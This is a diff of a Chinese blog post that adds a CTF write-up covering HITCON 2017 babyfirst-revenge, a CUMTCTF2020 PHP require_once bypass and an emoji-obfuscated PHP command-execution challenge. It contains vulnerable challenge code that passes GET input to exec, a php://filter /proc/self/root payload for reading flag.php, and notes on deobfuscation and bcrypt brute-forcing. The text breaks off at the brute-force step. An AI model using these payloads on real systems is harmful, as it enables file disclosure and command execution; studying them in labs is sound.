@@ -186,7 +186,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 10:19:11" itemprop="dateModified" datetime="2020-09-28T10:19:11+08:00">2020-09-28</time>
+                <time title="修改时间：2020-10-06 15:27:58" itemprop="dateModified" datetime="2020-10-06T15:27:58+08:00">2020-10-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -204,14 +204,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>11k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>10 分钟</span>
             </span>
 
         </div>
@@ -223,7 +223,96 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <h1 id="一些好玩的题目"><a href="#一些好玩的题目" class="headerlink" title="一些好玩的题目"></a>一些好玩的题目</h1><h2 id="Hitcon2017-babyfirst-reveng"><a href="#Hitcon2017-babyfirst-reveng" class="headerlink" title="Hitcon2017 babyfirst-reveng"></a>Hitcon2017 babyfirst-reveng</h2><p>github复现地址</p>
+<p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p>
+<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>命令执行构造反弹shell</p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>先说几个知识点：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;e\</span><br><span class="line">&gt;cho\</span><br><span class="line">&#39;123&#39;</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure>
+<p>在linux中换行可以执行间断的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># vi 1  //在1下写入cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># touch flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># echo "cumtctf&#123;i_am_so_cute&#125;" &gt;&gt; flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># sh 1</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure>
+<p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过</p>
+</blockquote>
+<h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="简单的文件包含？"><a href="#简单的文件包含？" class="headerlink" title="简单的文件包含？"></a>简单的文件包含？</h2><h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>require_once绕过</p>
+<p>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>] != <span class="string">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>] != <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry, this site is only optimized for those who comes from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f'</span>])) </span><br><span class="line">  <span class="keyword">include_once</span>($_POST[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure>
+<p>这里主要问题是<code>reuqire_once</code>的问题</p>
+<p><a href="https://www.anquanke.com/post/id/213235#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235#h3-2</a></p>
+<p>这里面的源码解析有得还是看不懂，日后再翻</p>
+<p>首先说一下php文件包含的机制是将<strong>已经包含的文件与文件的真实路径放进哈希表中</strong>，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再<code>require_once</code>。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>/proc/self指向当前进程的/proc/pid/</p>
+<p>/proc/self/root/指向/的符号</p>
+<p><img src="/2100/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p>
+</blockquote>
+<h2 id="👍🙌😃"><a href="#👍🙌😃" class="headerlink" title="👍🙌😃"></a>👍🙌😃</h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>代码格式化、反混淆，bcrypt爆破，<strong>命令执行</strong></p>
+<p>这个题 我只能说真的牛逼</p>
+<p>真的开眼界 还可以这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line">$🙐=<span class="keyword">array</span>(<span class="string">'🙐'</span>,<span class="string">'🙑'</span>,<span class="string">'🙒'</span>,<span class="string">'🙓'</span>,<span class="string">'🙔'</span>,<span class="string">'🙕'</span>,<span class="string">'🙖'</span>,<span class="string">'🙗'</span>,<span class="string">'🙘'</span>,<span class="string">'🙙'</span>,<span class="string">'🙚'</span>,<span class="string">'🙛'</span>,<span class="string">'🙜'</span>,<span class="string">'🙝'</span>,<span class="string">'🙞'</span>,<span class="string">'🙟'</span>);</span><br><span class="line">$🙠=<span class="keyword">array</span>(<span class="string">'🙠'</span>,<span class="string">'🙡'</span>,<span class="string">'🙢'</span>,<span class="string">'🙣'</span>,<span class="string">'🙤'</span>,<span class="string">'🙥'</span>,<span class="string">'🙦'</span>,<span class="string">'🙧'</span>,<span class="string">'🙨'</span>,<span class="string">'🙩'</span>,<span class="string">'🙪'</span>,<span class="string">'🙫'</span>,<span class="string">'🙬'</span>,<span class="string">'🙭'</span>,<span class="string">'🙮'</span>,<span class="string">'🙯'</span>);</span><br><span class="line">$🙰=<span class="keyword">array</span>(<span class="string">'🙰'</span>,<span class="string">'🙱'</span>,<span class="string">'🙲'</span>,<span class="string">'🙳'</span>,<span class="string">'🙴'</span>,<span class="string">'🙵'</span>,<span class="string">'🙶'</span>,<span class="string">'🙷'</span>,<span class="string">'🙸'</span>,<span class="string">'🙹'</span>,<span class="string">'🙺'</span>,<span class="string">'🙻'</span>,<span class="string">'🙼'</span>,<span class="string">'🙽'</span>,<span class="string">'🙾'</span>,<span class="string">'🙿'</span>);</span><br><span class="line">$😀=<span class="keyword">array</span>(<span class="string">'😀'</span>,<span class="string">'😁'</span>,<span class="string">'😂'</span>,<span class="string">'😃'</span>,<span class="string">'😄'</span>,<span class="string">'😅'</span>,<span class="string">'😆'</span>,<span class="string">'😇'</span>,<span class="string">'😈'</span>,<span class="string">'😉'</span>,<span class="string">'😊'</span>,<span class="string">'😋'</span>,<span class="string">'😌'</span>,<span class="string">'😍'</span>,<span class="string">'😎'</span>,<span class="string">'😏'</span>);</span><br><span class="line">$😐=<span class="keyword">array</span>(<span class="string">'😐'</span>,<span class="string">'😑'</span>,<span class="string">'😒'</span>,<span class="string">'😓'</span>,<span class="string">'😔'</span>,<span class="string">'😕'</span>,<span class="string">'😖'</span>,<span class="string">'😗'</span>,<span class="string">'😘'</span>,<span class="string">'😙'</span>,<span class="string">'😚'</span>,<span class="string">'😛'</span>,<span class="string">'😜'</span>,<span class="string">'😝'</span>,<span class="string">'😞'</span>,<span class="string">'😟'</span>);</span><br><span class="line">$😠=<span class="keyword">array</span>(<span class="string">'😠'</span>,<span class="string">'😡'</span>,<span class="string">'😢'</span>,<span class="string">'😣'</span>,<span class="string">'😤'</span>,<span class="string">'😥'</span>,<span class="string">'😦'</span>,<span class="string">'😧'</span>,<span class="string">'😨'</span>,<span class="string">'😩'</span>,<span class="string">'😪'</span>,<span class="string">'😫'</span>,<span class="string">'😬'</span>,<span class="string">'😭'</span>,<span class="string">'😮'</span>,<span class="string">'😯'</span>);</span><br><span class="line">$😰=<span class="keyword">array</span>(<span class="string">'😰'</span>,<span class="string">'😱'</span>,<span class="string">'😲'</span>,<span class="string">'😳'</span>,<span class="string">'😴'</span>,<span class="string">'😵'</span>,<span class="string">'😶'</span>,<span class="string">'😷'</span>,<span class="string">'😸'</span>,<span class="string">'😹'</span>,<span class="string">'😺'</span>,<span class="string">'😻'</span>,<span class="string">'😼'</span>,<span class="string">'😽'</span>,<span class="string">'😾'</span>,<span class="string">'😿'</span>);</span><br><span class="line">$🙀=<span class="keyword">array</span>(<span class="string">'🙀'</span>,<span class="string">'🙁'</span>,<span class="string">'🙂'</span>,<span class="string">'🙃'</span>,<span class="string">'🙄'</span>,<span class="string">'🙅'</span>,<span class="string">'🙆'</span>,<span class="string">'🙇'</span>,<span class="string">'🙈'</span>,<span class="string">'🙉'</span>,<span class="string">'🙊'</span>,<span class="string">'🙋'</span>,<span class="string">'🙌'</span>,<span class="string">'🙍'</span>,<span class="string">'🙎'</span>,<span class="string">'🙏'</span>);</span><br><span class="line">$🏁 = <span class="keyword">array</span>($🙠,$🙠,$🙰,$😀,$😐,$😠,$😰,$🙀);</span><br><span class="line">$😳😃😢🙉😲😗😦🙅 = <span class="string">"strlen"</span>;</span><br><span class="line">$😩😂😸🙉 = <span class="string">"chr"</span>;</span><br><span class="line">$🎁 = <span class="string">"base64_decode"</span>;</span><br><span class="line">$😱😨😞🙊😪😨😡😍 = <span class="string">"isset"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 😪😗😦😺😲😂😢😼<span class="params">($😳😃😢🙉)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">	$😲😗😦🙅= (<span class="string">"$😳😃😢🙉😲😗😦🙅"</span>)($😳😃😢🙉)/<span class="number">4</span>;</span><br><span class="line">	$😳😂😚😼 = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($😱😧😼🙀 = <span class="number">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class="line">		$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$😪😾😞😀 =<span class="number">0</span>;</span><br><span class="line">		$😳😂😦😺 =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($😱😽🙀🙁 =<span class="number">0</span>;$😱😽🙀🙁&lt;<span class="number">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($😱😂🙄🙂=<span class="number">0</span>;$😱😂🙄🙂&lt;<span class="number">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class="line">					$😪😾😞😀=$😱😽🙀🙁;</span><br><span class="line">					$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$😲😾😦🙄 = $😪😾😞😀*<span class="number">16</span>+$😳😂😦😺;</span><br><span class="line">		$😳😂😚😼 = $😳😂😚😼.(<span class="string">"$😩😂😸🙉"</span>)($😲😾😦🙄);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">	$😳😂😖🙅😪😗😚 = 😪😗😦😺😲😂😢😼(😜😃😪😸😳😹😉😃😴😃😳🙆😱😘😢🙄😲😓😉🙊😩😧😅😻😩😽😉😄😜🙇😍😍).😪😗😦😺😲😂😢😼(😲😧😡😁)($_SERVER[😪😗😦😺😲😂😢😼(😥😻😦😞😤😁😢😖😨😀😖😕😢😖😙😍)]);</span><br><span class="line">	😪😗😦😺😲😂😢😼(😲😧🙄😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class="line">	😪😗😦😺😲😂😢😼(😩😂😸😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &amp;&amp; ($😳😃😢🙉😲😗😦🙅)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[😪😗😦😺😲😂😢😼(😳😽😦🙊😪😨😡😍)])) &#123;</span><br><span class="line">		@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)(😪😗😦😺😲😂😢😼(😳😽😀😷😜😨😚😽😙😑😍😍) . $😳😂😖🙅😪😗😚);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$🎯 = <span class="keyword">new</span> Bcrypt();</span><br><span class="line">$🔑 = $_POST[😪😗😦😺😲😂😢😼(😳😗😖🙊😳😃😴😻)];</span><br><span class="line">$🔒 = 😪😗😦😺😲😂😢😼(😚😔😚😅😚😔😕🙇😚😖😚😓😪😽😻😄😥😨😒😛😣😼😖😢😲😥🙀😕😞😻😪😅😲😘😦🙉😣😽😦🙈😲😦😑🙅😞😽😞😞😲😺😴😀😪😗😉😜😩😃🙀😝😝😾😩😅😱😖😞😺😪😔😼😆😢😗😿🙊😴😁😸😼);</span><br><span class="line"><span class="keyword">if</span>($🎯-&gt;verify($🔑, $🔒)) &#123;</span><br><span class="line">	<span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒😂😪😨😚🙀😪😽😼😼😪😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class="line">	<span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😦😂😉😃😙😣😖😟😲😃😳🙃😱😗😖😺😱🙉😒🙀😴😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class="line">	😁😁();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒🙅😲😃😡😷😲😧😖😀😩😂😷😸😠😓😉😹😳😺😄😍));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是代码格式化，接着就是<strong>理解代码的执行逻辑，顺便改变代码逻辑</strong></p>
+<p>看题解上看的是第一个函数，也就是混淆</p>
+<p>为什么要先看第一个函数</p>
+<p><img src="/2100/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p>
+<p>所以我们就想直接看在不同参数下第一个函数执行输出的结果，所以在第一个函数中添加</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😪😗😦😺😲😂😢😼<span class="params">($😳😃😢🙉)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"加密后："</span>.$😳😃😢🙉;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">	$😲😗😦🙅= (<span class="string">"$😳😃😢🙉😲😗😦🙅"</span>)($😳😃😢🙉)/<span class="number">4</span>;</span><br><span class="line">	$😳😂😚😼 = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($😱😧😼🙀 = <span class="number">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class="line">		$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$😪😾😞😀 =<span class="number">0</span>;</span><br><span class="line">		$😳😂😦😺 =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($😱😽🙀🙁 =<span class="number">0</span>;$😱😽🙀🙁&lt;<span class="number">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($😱😂🙄🙂=<span class="number">0</span>;$😱😂🙄🙂&lt;<span class="number">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class="line">					$😪😾😞😀=$😱😽🙀🙁;</span><br><span class="line">					$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$😲😾😦🙄 = $😪😾😞😀*<span class="number">16</span>+$😳😂😦😺;</span><br><span class="line">		$😳😂😚😼 = $😳😂😚😼.(<span class="string">"$😩😂😸🙉"</span>)($😲😾😦🙄);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"原文："</span>.(<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之后依次修改代码逻辑，替换其中第一个函数输出结果</p>
+<p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$🎯 = <span class="keyword">new</span> Bcrypt();</span><br><span class="line"></span><br><span class="line">$🔑 = $_POST[<span class="string">"passwd"</span>];</span><br><span class="line">$🔒 = <span class="string">"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe"</span>;</span><br><span class="line"><span class="keyword">if</span>($🎯-&gt;verify($passwd, $lock)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Password verified!"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Wow!!Now,hack it!"</span>;</span><br><span class="line">	😁😁();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;Password not match!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后发现有composer包，安装，然后查资料bcrypt</p>
+<h3 id="bcrypt"><a href="#bcrypt" class="headerlink" title="bcrypt"></a>bcrypt</h3><p><code>bcrypt</code>是一种哈希算法，可以通过硬件进行扩展（通过可配置的循环次数）。</p>
+<p><strong><code>bcrypt</code>是一种单向哈希算法。</strong>如果不知道盐，圆<strong>和密码</strong>（密码），则无法检索纯文本密码。</p>
+<blockquote>
+<p>加盐：</p>
+<p>就是人为的通过一组随机字符与用户原密码的组合形成一个新的字符，从而增加破译的难度。</p>
+</blockquote>
+<p>在php中，主要有内置的函数<code>password_hash</code>和<code>password_verify</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT);</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="string">'password'</span>,$a))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(password_get_info($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出信息</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="string">'algo'</span> =&gt; int <span class="number">1</span></span><br><span class="line">  <span class="string">'algoName'</span> =&gt; string <span class="string">'bcrypt'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'options'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">'cost'</span> =&gt; int <span class="number">10</span></span><br><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT,<span class="keyword">array</span>(<span class="string">'cost'</span> =&gt; <span class="number">11</span>));</span><br><span class="line"><span class="comment">//相应的cost也会变为11；</span></span><br></pre></td></tr></table></figure>
+<p>接下来就是爆破，已知密码为bcrypt+4位小写字母</p>
